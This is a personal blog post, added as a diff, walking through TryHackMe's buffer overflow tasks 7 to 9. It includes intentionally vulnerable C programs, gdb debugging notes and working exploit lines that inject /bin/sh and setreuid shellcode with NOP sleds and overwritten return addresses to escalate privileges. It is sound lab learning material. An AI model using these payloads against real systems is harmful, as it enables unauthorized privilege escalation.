@@ -1,0 +1,561 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>My first (proper?) buffer overflow</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><link rel="stylesheet" href="/src/rougier.css" />
+    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+  window.MathJax = {
+    tex: {
+      ams: {
+        multlineWidth: '85%'
+      },
+      tags: 'ams',
+      tagSide: 'right',
+      tagIndent: '.8em'
+    },
+    chtml: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    svg: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    output: {
+      font: 'mathjax-modern',
+      displayOverflow: 'overflow'
+    }
+  };
+</script>
+
+<script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">My first (proper?) buffer overflow</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orga383caf">Criticism</a></li>
+<li><a href="#org0cb3e9f">Task 7</a></li>
+<li><a href="#org5ce728d">Task 8</a></li>
+<li><a href="#orgd236108">Task 9</a></li>
+<li><a href="#org0092201">In conclusion</a></li>
+<li><a href="#orgbe39cbe">Links:</a></li>
+</ul>
+</div>
+</div>
+<p>
+Everyone that works with computers has heard of the term buffer
+overflow. It is not uncommon to cause such an unwanted behavior when
+writing code yourself, over populating memory or performing prohibited
+read/write operations. However, even though I understood what was
+happening in a broader sense, I did not have any experience with
+buffer overflows. Thankfully, my project on the Computer Network
+Security course, reading on <a href="https://ieeexplore.ieee.org/document/6547101">this paper</a>, gave me &ldquo;a reason&rdquo; to try and
+get into more depth. <sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
+</p>
+
+<p>
+I saw a couple of videos, wrote more than my fair share of articles,
+and dug into one or more websites, but in the end, when I tried
+TryHackMe&rsquo;s Buffer Overflow room, I was stuck.
+</p>
+
+<div id="outline-container-orga383caf" class="outline-2">
+<h2 id="orga383caf"><a href="#orga383caf">Criticism</a></h2>
+<div class="outline-text-2" id="text-orga383caf">
+<p>
+I feel that this room could (and should) be improved. While it <b>does</b>
+serve as an introduction to Buffer Overflow, it surely is not a
+tutorial/walkthrough targeted towards beginners, implied by its &ldquo;easy&rdquo;
+difficulty.
+</p>
+
+<p>
+It was rather disheartening, to see myself get so stuck.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org0cb3e9f" class="outline-2">
+<h2 id="org0cb3e9f"><a href="#org0cb3e9f">Task 7</a></h2>
+<div class="outline-text-2" id="text-org0cb3e9f">
+<p>
+In this task we are asked to get <code>special</code>, instead of <code>normal</code> to
+execute:
+</p>
+<div class="org-src-container">
+<pre class="src src-c" id="orgd933099"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;unistd.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
+
+<span class="org-type">void</span> <span class="org-function-name">special</span>()
+{
+    printf(<span class="org-string">"this is the special function\n"</span>);
+    printf(<span class="org-string">"you did this, friend!\n"</span>);
+}
+
+<span class="org-type">void</span> <span class="org-function-name">normal</span>()
+{
+    printf(<span class="org-string">"this is the normal function\n"</span>);
+}
+
+<span class="org-type">void</span> <span class="org-function-name">other</span>()
+{
+    printf(<span class="org-string">"why is this here?"</span>);
+}
+
+<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> **<span class="org-variable-name">argv</span>)
+{
+    <span class="org-keyword">volatile</span> <span class="org-type">int</span> (*<span class="org-function-name">new_ptr</span>) () = normal;
+    <span class="org-type">char</span> <span class="org-variable-name">buffer</span>[14];
+    gets(buffer);
+    new_ptr();
+}
+</pre>
+</div>
+
+<p>
+Launching GDB:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org402cd96">gdb ./func-pointer
+</pre>
+</div>
+
+
+<p>
+I had not played around with gdb before, so I did not have any
+ready-to-go set of notes available, and had to build my own from
+scratch. 
+</p>
+
+<p>
+To view the assembly commands and memory addresses for each function I
+used the following:
+</p>
+<pre class="example" id="orgac576b3">
+disassemble main
+disassemble special
+disassemble normal
+</pre>
+
+
+
+<div id="org7a7ffe0" class="figure">
+<p><img src="images/Task_7/20231205_142939_screenshot.png" alt="20231205_142939_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 1: </span>Interesting assembly commands and locations</p>
+</div>
+
+<p>
+At this point, I knew that the two variables, pointer and buffer were
+adjacent in memory, and since <code>gets()</code> is vulnerable to buffer
+overflows, that means I could potentially use it to write to the <code>new_ptr</code>
+</p>
+
+<p>
+I also knew that:
+</p>
+<ul class="org-ul">
+<li><code>0x400582</code> is the address of normal</li>
+<li><code>0x400567</code> is the address of special</li>
+</ul>
+
+<p>
+Having seen a related LiveOverflow video (an old one that got me
+thinking of how slowly experience builds up), I was aware of the
+<code>define hook-stop</code> functionality to print specific parts of memory and
+or registers at each break point, so all I had to do was set proper
+breakpoints and fool around with the input.
+</p>
+
+<p>
+In the end, I only needed one breakpoint, which I placed at position 2
+in the image above: I just wanted to see the memory right before the
+execution of the function <code>new_ptr</code> pointed to.
+</p>
+
+<p>
+Then I started experimenting:
+</p>
+<ul class="org-ul">
+<li><code>run</code></li>
+<li>give input</li>
+<li>see memory</li>
+<li>repeat</li>
+</ul>
+
+
+<p>
+It quickly become evident that I was writing in the highlighted area,
+and wanted to change the contents of the &ldquo;circled&rdquo; one&rsquo;s:
+</p>
+
+<div id="org8592c8a" class="figure">
+<p><img src="images/Task_7/20231205_143929_screenshot.png" alt="20231205_143929_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 2: </span>Highlighting memory dump</p>
+</div>
+
+<p>
+Unfortunately, I could not get the payload I had created to work
+inside of gdb, not knowing how to get it to parse my input as hex: I
+could see that I modified the target area (first payload), but the
+second one could not work, to set it to its proper value (0x400567)
+</p>
+
+<pre class="example" id="orgb19fd83">
+AAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAA\x67\x05\x40\x00
+</pre>
+
+
+<div id="orgcfc1e84" class="figure">
+<p><img src="images/Task_7/20231205_144132_screenshot.png" alt="20231205_144132_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 3: </span>Setting <code>new_ptr</code> to all As</p>
+</div>
+
+<p>
+To bypass this I relied on <code>echo</code>: 
+</p>
+
+
+<div id="orgde54440" class="figure">
+<p><img src="images/Task_7/20231205_140516_screenshot.png" alt="20231205_140516_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 4: </span>Solution</p>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org5ce728d" class="outline-2">
+<h2 id="org5ce728d"><a href="#org5ce728d">Task 8</a></h2>
+<div class="outline-text-2" id="text-org5ce728d">
+<div class="note" id="org60df325">
+<p>
+This was the first buffer overflow I attempted that resulted in the
+execution of a different program for Privilege Escalation. Mistakes
+are undoubtedly plenty, and if you find any, please feel free to
+correct me in the comments.
+</p>
+
+</div>
+
+<div class="org-src-container">
+<pre class="src src-c" id="org1b734ae"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
+
+<span class="org-type">void</span> <span class="org-function-name">copy_arg</span>(<span class="org-type">char</span> *<span class="org-variable-name">string</span>)
+{
+    <span class="org-type">char</span> <span class="org-variable-name">buffer</span>[140];
+    strcpy(buffer, string);
+    printf(<span class="org-string">"%s\n"</span>, buffer);
+    <span class="org-keyword">return</span> 0;
+}
+
+<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> **<span class="org-variable-name">argv</span>)
+{
+    printf(<span class="org-string">"Here's a program that echo's out your input\n"</span>);
+    copy_arg(argv[1]);
+}
+</pre>
+</div>
+
+<p>
+Keeping it short,  when a function ends, the return address - the
+address from which the computer should continue - exists in memory.
+One (not-so-innocent) user, might try to modify this, so that another
+program executes, thus modifying the flow of the program.
+</p>
+
+<p>
+Even though I suppose that this is not actual reverse engineering -
+but focusing only on the buffer overflow part of the challenge: We
+know the source code: The snippet above gives us 140 bytes to store
+information, before it prints it to the command line. We could, and
+this is the target of this task, populate <i>some</i> of these 140 bytes with
+a shellcode (code to spawn a shell for us), and modify the return
+address of the <code>copy_arg()</code> function, so that when it is finished, it
+does not return to <code>main()</code> but executes our payload, residing inside of
+the <code>buffer</code> variable.
+</p>
+
+<p>
+In addition to those 140 bytes to populate, we should also add enough
+contents to overwrite the return value of the function.
+</p>
+
+
+<blockquote>
+<p>
+Silly as it may seem, chatgpt does more than just a fine job helping
+you revise assembly. It was fun analyzing where I should look at :P
+</p>
+</blockquote>
+
+
+
+<div id="org325b827" class="figure">
+<p><img src="images/Task_8/20231205_234129_screenshot.png" alt="20231205_234129_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 5: </span>Filling buffer with A&rsquo;s and checking the return address</p>
+</div>
+
+<p>
+Through experimentation we can understand the following:
+</p>
+<ul class="org-ul">
+<li>The highlighted one&rsquo;s (and the 0x41s in between) are our input</li>
+<li>The address in the block is the return address - the command
+following <code>copy_arg</code> in main</li>
+</ul>
+
+<p>
+So while our input did its job of populating the buffer variable, it
+needs to be improved to work for us:
+</p>
+<ul class="org-ul">
+<li>Glancing at the picture we can see that the return address is found
+152 bytes after the first &rsquo;A&rsquo; (0x41), and has a length of 4 bytes,
+meaning that we are interested in the bytes 152-156.</li>
+</ul>
+
+<p>
+After modifying our input string just a little bit, we <i>hope</i> to get the
+return address &ldquo;populated&rdquo; with As.
+</p>
+
+
+<div id="org7bb6c59" class="figure">
+<p><img src="images/Task_8/20231205_234916_screenshot.png" alt="20231205_234916_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 6: </span>Overwritten return address</p>
+</div>
+
+<p>
+The &rsquo;\x90&rsquo; string is the NOP (no operation) flag, and is extremely
+useful when used as padding, because when assembly gets evaluated and
+a NOP flag is encountered it is simply skipped (does not cause any errors) 
+</p>
+
+<p>
+At this point, focusing on the buffer overflow and not on the
+shellcode, I got the hex shellcode from a writeup to continue. (The
+one in the room did not seem to work). This is 40 bytes.
+</p>
+
+<pre class="example" id="org404e093">
+\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+</pre>
+
+<p>
+Modifying our input string once again to include the shellcode and the
+buffer&rsquo;s address as a return address (remember, NOP), we expect to get
+a shell:
+</p>
+<ul class="org-ul">
+<li>0x7fffffffe370 becomes:
+<ul class="org-ul">
+<li>&rsquo;\x70\xe3\xff\xff\xff\x7f&rsquo;</li>
+<li>Appended to our &ldquo;payload&rdquo;</li>
+</ul></li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="org1646e57">/home/user1/overflow-3/buffer-overflow $(python -c <span class="org-string">"print ('\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x70\xe3\xff\xff\xff\x7f')"</span>)
+</pre>
+</div>
+<ul class="org-ul">
+<li>That did not work at first for me because of a peculiar floating
+error. After inspecting my &ldquo;payload&rdquo; again and again I replaced the
+second padding with As instead of NOPs. It then worked.</li>
+</ul>
+
+
+<p>
+Getting a shell, though, is not enough, since we do not have
+permission to view the file we want (we remain as the same user,
+despite the suid bit). We want to change our shellcode to have a
+<code>setuid()</code> statement in it:
+</p>
+<ul class="org-ul">
+<li>This is cheating, but once again, I reused someone else&rsquo;s shellcode,
+even though I knew about real and effective uids. It was out of
+scope for &ldquo;my investigation&rdquo; to get the shellcode.</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-bash">/home/user1/overflow-3/buffer-overflow $(python -c <span class="org-string">"print ('\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x70\xe3\xff\xff\xff\x7f')"</span>)
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd236108" class="outline-2">
+<h2 id="orgd236108"><a href="#orgd236108">Task 9</a></h2>
+<div class="outline-text-2" id="text-orgd236108">
+<p>
+This seems exactly the same as before. Let&rsquo;s see if we can tackle it quickly:
+</p>
+<div class="org-src-container">
+<pre class="src src-c" id="orgcb4089a"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
+<span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
+
+<span class="org-type">void</span> <span class="org-function-name">concat_arg</span>(<span class="org-type">char</span> *<span class="org-variable-name">string</span>)
+{
+    <span class="org-type">char</span> <span class="org-variable-name">buffer</span>[154] = <span class="org-string">"doggo"</span>;
+    strcat(buffer, string);
+    printf(<span class="org-string">"new word is %s\n"</span>, buffer);
+    <span class="org-keyword">return</span> 0;
+}
+
+<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> **<span class="org-variable-name">argv</span>)
+{
+    concat_arg(argv[1]);
+}
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>doggo has 5 characters length, meaning that there are 149 more
+characters left to fill buffer. After that, there will be a padding
+and the return address.</li>
+<li>Following the same methodology as before, I fired up <code>gdb</code>, set
+<code>stop-hook</code> up and &#x2026;</li>
+</ul>
+
+
+<div id="org9837cc4" class="figure">
+<p><img src="images/Task_9/20231206_002813_screenshot.png" alt="20231206_002813_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 7: </span>Started from the bottom now we here</p>
+</div>
+
+<p>
+I then created the setuid payload once again, and proceeded to
+modify the payload to fit in our example.
+</p>
+<pre class="example" id="org51e0893">
+root@ip-10-10-80-64:~# pwn shellcraft -f d amd64.linux.setreuid 1003
+\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+</pre>
+
+<p>
+Namely the changes (compared to task 8):
+</p>
+<ol class="org-ol">
+<li>Different size - but we can still use the same payload:
+<ul class="org-ul">
+<li>Bytes 164-170 are of interest now</li>
+<li>Our payload remains 54 bytes in length, so with a padding of 100
+and 9 we should be fine.</li>
+</ul></li>
+<li>Different user id:
+<ul class="org-ul">
+<li>Already fixed in our setuid payload (went ahead and checked )</li>
+</ul></li>
+<li>Different address:
+<ul class="org-ul">
+<li>As shown in the image above:
+<ul class="org-ul">
+<li>0x7fffffffe3b0</li>
+<li>0xb0e3ffffff7f</li>
+<li>\xb0\xe3\xff\xff\xff\x7f</li>
+</ul></li>
+</ul></li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-bash">./buffer-overflow-2 $(python -c <span class="org-string">"print ('\x90'*99 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*10 + '\xb0\xe3\xff\xff\xff\x7f')"</span>)
+</pre>
+</div>
+
+<p>
+That should work but I&rsquo;m still getting segmentation fault. I suspect 
+that my shell code address is somehow wrong. (Strangely, this somehow
+worked after I modified the address to something closer to my
+shellcode address in gdb - even though I had used an address pointing
+to the preceding NOPs)
+</p>
+</div>
+</div>
+
+<div id="outline-container-org0092201" class="outline-2">
+<h2 id="org0092201"><a href="#org0092201">In conclusion</a></h2>
+<div class="outline-text-2" id="text-org0092201">
+<p>
+This might be one of the best rooms I have ever checked out and I am
+glad I did.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgbe39cbe" class="outline-2">
+<h2 id="orgbe39cbe"><a href="#orgbe39cbe">Links:</a></h2>
+<div class="outline-text-2" id="text-orgbe39cbe">
+<p>
+Although I usually keep myself from searching for walkthroughs and
+solutions, this time, partly due to the insufficiency of the
+instructions and partly due to my inability to see what went wrong in
+my good-looking attempts to solve each task , I have checked some
+articles covering that same room
+</p>
+<ul class="org-ul">
+<li><a href="https://l1ge.github.io/tryhackme_bof1/">https://l1ge.github.io/tryhackme_bof1/</a>
+<ul class="org-ul">
+<li>I really liked the way of writing.</li>
+</ul></li>
+<li><a href="https://bobloblaw321.wixsite.com/website/post/tryhackme-buffer-overflows">https://bobloblaw321.wixsite.com/website/post/tryhackme-buffer-overflows</a> 
+<ul class="org-ul">
+<li>Nice explanation of step 7. It was the author&rsquo;s comment on the
+proper way of entering input that made me realize my payload was
+not wrong, but the way I delivered it was.</li>
+</ul></li>
+<li><a href="https://stackoverflow.com/questions/32345320/get-return-address-gdb">https://stackoverflow.com/questions/32345320/get-return-address-gdb</a>
+<ul class="org-ul">
+<li>The <code>info frame</code> command helped me better understand</li>
+</ul></li>
+</ul>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+I am planning on publishing the resulting work here as soon as
+I finish it. It was invigorating to see how my previous work,
+structure and collection/organization allowed me to effectively tackle
+the task of writing an academic paper. Maybe some notes on that are
+due as well.
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2023-12-05 Tue 13:34 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
